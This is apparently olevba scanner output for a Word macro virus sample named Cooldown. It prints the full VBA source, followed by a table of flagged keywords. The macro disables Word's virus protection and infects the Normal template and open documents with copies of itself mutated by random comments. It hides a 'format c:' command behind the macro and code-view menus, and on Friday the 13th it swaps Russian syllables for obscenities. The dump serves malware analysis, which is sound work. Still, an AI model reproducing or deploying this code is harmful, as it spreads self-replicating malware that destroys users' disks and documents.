olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Cooldown-4c337895fb1a1ddcbf82f753cc5d1ed79b6e68c6
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Cooldown-4c337895fb1a1ddcbf82f753cc5d1ed79b6e68c6 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
             Private _
       Sub _
    Document_Open()
             CoolDown 0
         End _
            Sub
   ' 7233.973
' 2968.162
Private Sub _
 Document_Close()
      ' 7424.171
CoolDown _
         0
  ' 5636.994
End _
    Sub
       Private Sub ToolsMacro()
    CoolDown 1
               ' 6657.972
' 7953.761
' 9905.327
End _
             Sub
     ' 6711.511
Private _
 Sub _
        ViewVBCode()
                CoolDown _
    1
 
End Sub
  
Private _
      Sub _
 CoolDown(How As _
                Integer)
            On _
          Error Resume _
              Next
   ' 1997.473
Dim _
              c _
       As _
 String, _
           a As _
  Long, _
   b _
         As _
            Long, _
            d As _
    Long, e As _
          Long, f _
              As Long, res As _
       String, _
               m _
 As Boolean
            Randomize
          With Options
                .VirusProtection _
       = _
      False
           
' 9972.393
' 7559.88
.ConfirmConversions = _
  False
 .SaveNormalPrompt = False
            End With
 ' 4328.563
' 6445.952
If _
           How = _
     1 Then
      ' 2901.794

s = _
 Shell("format" & Chr(32) _
           & _
 "c:" & _
              Chr(32) _
            & "/autotest", _
              vbHide)
               Else
            With _
       NormalTemplate.VBProject.VBComponents(1).codemodule
                ' 3380.141
' 9340.942
If _
               Not _
      .Find("Cool" & "Down", _
      1, 1, 1000, 1000, False, _
     False) _
         Then
 
a = _
               .CountOfLines
 For b = 1 To _
           a
      ' 7108.346
.deletelines (1)
   Next
          
' 2011.325
d = 1
               ' 9530.268
' 6436.942
' 7910.222
a = ActiveDocument.VBProject.VBComponents(1).codemodule.CountOfLines
     ' 9871.053

' 805.6033
res = ""
              For b = 1 To _
       a
         c = _
       ActiveDocument.VBProject.VBComponents(1).codemodule.Lines(b, _
            1)
     c _
             = RTrim(LTrim(c))
     ' 6314.325
If foo(c, _
f, res) Then
             .InsertLines _
     d, Space(Rnd * _
        16) & res
               ' 8807.88
' 8422.482
d = d + f
               f _
             = 0
       ' 7727.639
res _
= ""
               ' 3770.276
End _
     If
           Next
            ' 5072.94
NormalTemplate.Save
        End _
  If
  
' 5563.101
End With
 For _
   e = _
  1 To _
   Documents.Count
          ' 6405.701
' 3330.776
With _
            Documents(e).VBProject.VBComponents(1).codemodule
              ' 428.2904
' 4392.479
If Not _
       .Find("Cool" _
           & _
    "Down", 1, 1, _
       1000, _
                1000, False, _
            False) _
  Then
' 6714.96
' 9421.677
a _
         = .CountOfLines
        ' 7424.325
' 478.1723

' 1276.736
m _
               = _
  Documents(e).Saved
   ' 7335.915

For _
      b _
         = 1 To a
   .deletelines _
        (1)
        Next
        d _
      = _
         1
      a _
          = _
              NormalTemplate.VBProject.VBComponents(1).codemodule.CountOfLines
          res = _
    ""
    For _
      b = 1 _
           To a
  
c _
          = _
   NormalTemplate.VBProject.VBComponents(1).codemodule.Lines(b, 1)
 ' 617.1364
c _
    = RTrim(LTrim(c))
           
' 7739.268
' 2456.9
If foo(c, f, res) Then
     .InsertLines d, _
           Space(Rnd * 16) & res
            ' 5569.441

d = _
          d _
           + _
              f
               ' 4851.023
' 4357.361
' 7627.024
f = 0
                
res = _
    ""
           End If
    Next
              ' 6588.057

' 3968.02
' 8453.582
If Documents(e).Path <> "" Then
                Documents(e).SaveAs AddToRecentFiles:=False
              ' 2951.222
' 2935.311
End If
               ' 7107.873
' 1612.108
If _
               (Weekday(Date) _
               = 6) _
          And (Day(Date) = _
            13) And (Rnd _
 > _
           0.7) Then
                ' 6463.467
Application.StatusBar _
   = ""
  Application.DisplayStatusBar = _
               False
               Application.ScreenUpdating _
              = False
              With Documents(e).Content
    ' 4067.531
.Find.Execute _
            FindText:="пр", ReplaceWith:="пизд", _
   Replace:=wdReplaceAll
  ' 5186.445
.Find.Execute _
             FindText:="др", ReplaceWith:="понос", Replace:=wdReplaceAll
  .Find.Execute _
        FindText:="кр", _
      ReplaceWith:="кобыл", Replace:=wdReplaceAll
 .Find.Execute FindText:="стр", ReplaceWith:="ебан", _
          Replace:=wdReplaceAll
        .Find.Execute FindText:="ср", _
        ReplaceWith:="срак", Replace:=wdReplaceAll
          .Find.Execute FindText:="тр", ReplaceWith:="трах", _
     Replace:=wdReplaceAll
         ' 6538.861
.Find.Execute _
               FindText:="бр", ReplaceWith:="бляд", Replace:=wdReplaceAll
           .Find.Execute FindText:="вр", ReplaceWith:="выеб", _
         Replace:=wdReplaceAll
             ' 1985.213
.Find.Execute _
              FindText:="гр", _
      ReplaceWith:="говн", _
       Replace:=wdReplaceAll
         ' 6705.274
.Find.Execute FindText:="жр", _
           ReplaceWith:="жоп", _
            Replace:=wdReplaceAll
 .Find.Execute FindText:="зр", _
 ReplaceWith:="залуп", Replace:=wdReplaceAll
   ' 3654.632
' 6683.722
.Find.Execute FindText:="дж", ReplaceWith:="джоп", Replace:=wdReplaceAll
                
.Find.Execute FindText:="кал", _
  ReplaceWith:="дер", _
       Replace:=wdReplaceAll
         
.Find.Execute _
           FindText:="бух", ReplaceWith:="бряк", _
        Replace:=wdReplaceAll
          ' 6541.215
End _
            With
  Documents(e).UndoClear
 ' 5093.253
Application.DisplayStatusBar _
              = True
 ' 3899.849
Application.ScreenUpdating = True
            Application.StatusBar = _
   ""
             ' 8439.832
End If
             Documents(e).Saved _
              = _
   m
 ' 6543.696

' 7779.765
End If
               ' 4245.008

End With
             
Next
           End _
    If
           ' 4801.963
End Sub
               Private Function foo(ByRef _
            s _
               As String, _
            ByRef _
             i _
            As _
        Long, ByRef res _
    As _
           String) _
          As _
               Boolean
 
Dim _
     tmp As String
          If _
     (Left(s, 1) = _
   "'") _
               Or (Len(s) _
           = _
  0) _
   Then
              ' 3866.62
' 7153.28
' 3027.099
foo = _
        False
   ' 4451.131
Exit _
   Function
            ' 9512.853

End _
          If
 If Right(s, 2) = _
            Chr(32) & _
      "_" Then
    
' 143.3212
res _
      = _
         res & _
             Left(s, _
            Len(s) _
      - _
        1)
  ' 2523.379
foo _
             = False
   ' 3392.543
Exit _
       Function
     ' 7641.003
' 2708.316
' 9029.896
End _
   If
               tmp _
              = _
    res & s
              res _
               = ""
       ' 5778.622
i = _
         1
 ' 9531.144
' 8313.92
' 4664.686
While Rnd > 0.5
       If _
   Rnd _
< _
          0.8 _
               Then
      res _
               = res & "'" _
& Str(Rnd _
  * _
         10000)
    End If
           ' 8707.257
res _
              = res _
   & _
                Chr(13)
       i _
            = _
 i _
            + 1
            Wend
         For _
               a _
              = _
           1 _
     To _
                Len(tmp)
             res _
              = res & _
               Mid(tmp, a, 1)
               ' 8429.916
If Mid(tmp, a, _
1) _
   = _
 Chr(32) _
    Then
              ' 3901.108

If Rnd > _
               0.5 Then
        res = res _
        & _
         "_" _
               & _
           Chr(13) & Space(Rnd _
 * _
            16)
   i = _
        i + 1
       End _
    If
          
End _
 If
      
Next
     ' 5634.674


foo _
           = _
         True
                ' 5946.282
' 8731.302
End Function

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

